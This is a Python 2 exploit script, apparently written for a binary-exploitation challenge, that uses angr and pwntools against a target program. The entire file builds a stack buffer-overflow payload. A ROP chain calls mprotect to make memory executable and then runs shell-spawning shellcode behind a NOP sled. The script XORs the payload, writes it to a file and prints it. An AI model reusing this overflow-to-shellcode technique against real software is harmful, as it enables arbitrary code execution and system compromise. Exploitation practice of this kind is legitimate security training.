#!/usr/bin/env python2
import angr
import find
import sys
from pwn import *

context(arch = 'amd64')

tar = sys.argv[1]


# Find dynamic elements in file
loc = find.get_addresses(tar)

"""
# Create symbolic buffer
p = angr.Project(tar)
buf = angr.claripy.BVS("buf",48*8)
start_state = p.factory.blank_state(addr=loc['start'])
start_state.memory.store(loc['buf'], buf)

# Setup a stack frame
start_state.regs.rbp = start_state.regs.rsp
start_state.regs.rsp = start_state.regs.rsp - 0x50
start_state.memory.store(start_state.regs.rsp, start_state.se.BVV(0, 8*0x32))

# Setup stepper
pg = p.factory.path_group(start_state)
def step_func(pg):
    print pg
    pg.drop(filter_func = lambda path: path.addr == loc['avoid'])
    pg.stash(filter_func = lambda path: path.addr == loc['target'], from_stash='active', to_stash='found')
    return pg
pg.step(step_func = step_func, until = lambda pg: len(pg.found) > 0)
print pg.errored
f = pg.found[0]
print f.state
cert = f.state.se.any_str(buf)
"""

# FIXED

# Create killstring
# cert = '45a64da71bf41084a13d7c2812be721eafc52945ce14815f239b42139e4ff78561cdec4936174ddc288ae81dab39f636'.decode('hex')
cert = '29084d21ca1323f49d00eca94a53af21d7b21f268506c902191f91e253e4f3a07acf448dc2dcde02e481de40ce0df409'.decode('hex')
print cert.encode('hex')

mprotect = loc['plt_mprotect']
overflow = loc['buf_loc']
gadget = loc['load_gadget']

# kill = '29084d21ca1323f49d00eca94a53af21d7b21f268506c902191f91e253e4f3a07acf448dc2dcde02e481de40ce0df409'.decode('hex')

pad0 = loc['overflow_size']
pad1 = 0x200
pad2 = 0x100

# Ret to load gadget with modified RBP
arg_addr = overflow + pad2
new_rbp = arg_addr + loc['load_offset']
print 'Load RBP = 0x%x' % new_rbp
kill = cyclic(pad0, alphabet = 'ABCD')
kill += p64(new_rbp)                        # Set RBP for load gadget
kill += p64(gadget)                         # Load arguments into registers

# Prep mprotect arguments
shellcode_addr = overflow + pad1 + 25  # Shellcode address
page = shellcode_addr & 0xFFFFFFFFFFFFF000
print 'Page = 0x%x' % page
kill += cyclic(pad2 - len(kill))
kill += p64(page)                           # RDI
kill += p64(0x1338)                         # junk (RCX)
kill += p64(0x1337)                         # junk (R8)
kill += p64(0x1000)                         # RSI
kill += p64(0x7)                            # RDX
kill += p64(page)                           # RAX (sometimes RDI <- RAX)

# Run mprotect followed by shellcode
new_rbp = overflow
print 'Mprotect RSP = 0x%x' % new_rbp
kill += cyclic(loc['load_offset'] - 0x30, n = 8)   # Get to RBP (RBP now points here)
kill += p64(new_rbp)
kill += p64(mprotect)
kill += p64(shellcode_addr - 1) # For some F***ing reason, it writes a 0x00 byte here
# kill += p64(shellcode_addr) # For some F***ing reason, it writes a 0x00 byte here

# Shellcode region
print 'Add : %d' % (pad1 - len(kill))
kill += 'A' * (pad1 - len(kill))
print '0x%x' % (len(kill) + overflow)
shell = asm(shellcraft.sh())
print '0x' + shell[:8][::-1].encode('hex')
kill += '\x90' * 50
kill += shell
print 'Shellcode at 0x%x' % shellcode_addr

# Run mprotect
"""
new_rsp = overflow - 0x300
print 'Mprotect RSP = 0x%x' % new_rsp
kill += p64(overflow - new_rsp)                    # Set RBP (to avoid messing up payload)
kill += p64(mprotect)
kill += 'A' * 8
kill += p64(shellcode_addr)
kill += '\x90' * (pad2 - len(kill))
kill += asm(shellcraft.sh())
"""

kill_str = xor(cert + kill, loc['pad'], cut = 'max')

# Generate gdbinit
write('gdbinit', '''
        b *0x%x
        b *0x%x
        b *0x75221BF
        r
        c
''' % (gadget, shellcode_addr))
write('sploit', kill_str.encode('hex'))
# p = process([tar, kill_str.encode('hex')])


print 'Here is some poison:'

print kill_str.encode('hex')
